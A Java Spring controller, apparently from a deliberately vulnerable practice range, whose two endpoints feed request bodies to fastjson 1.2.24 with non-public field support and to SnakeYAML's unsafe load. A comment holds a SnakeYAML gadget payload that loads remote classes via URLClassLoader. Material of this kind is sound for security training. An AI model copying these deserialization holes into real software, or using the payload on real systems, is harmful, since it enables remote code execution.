package com.range.demo.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.range.demo.entity.PathInfo;
import com.range.demo.utils.ResponseResult;
import com.range.demo.utils.ShellExcute;
import io.swagger.annotations.ApiOperation;
import org.springframework.boot.json.YamlJsonParser;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;
import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Map;

@RestController
@RequestMapping("/dserialize")
public class Deserialize {

    @ApiOperation(value = "fastjson", notes = "fastjson 1.2.24查看请求")
    @PostMapping(value = "/fastjson/1.2.24", produces = MediaType.APPLICATION_JSON_VALUE)
    public ResponseResult<String> start(@RequestBody String data) throws IOException {
        JSONObject jsonObject= JSON.parseObject(data, Feature.SupportNonPublicField);
       //ret.put("code",200);
       //ret.put("data","Hello"+jsonObject.get("name"));
        String result=jsonObject.get("name").toString();
        if (result != null) {
            return new ResponseResult<>(result, "执行成功", 200);
        }
        return new ResponseResult<>("result is null", "执行成功", 200);
    }
    @ApiOperation(value = "snakeyaml",notes="sankeyaml 反序列化")
    @PostMapping(value = "/snakeyaml", produces = MediaType.APPLICATION_JSON_VALUE)
    public ResponseResult<String> load(@RequestBody String data)  {
        //!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/"]]]]

        Yaml yaml=new Yaml();
        Map<String,Object> object=yaml.load(data);
        String param=JSON.toJSONString(object);
        if(param!=null){
            return new ResponseResult<>(param,"执行成功",200);
        }
        return new ResponseResult<>("result is null", "执行成功", 200);
    }

}
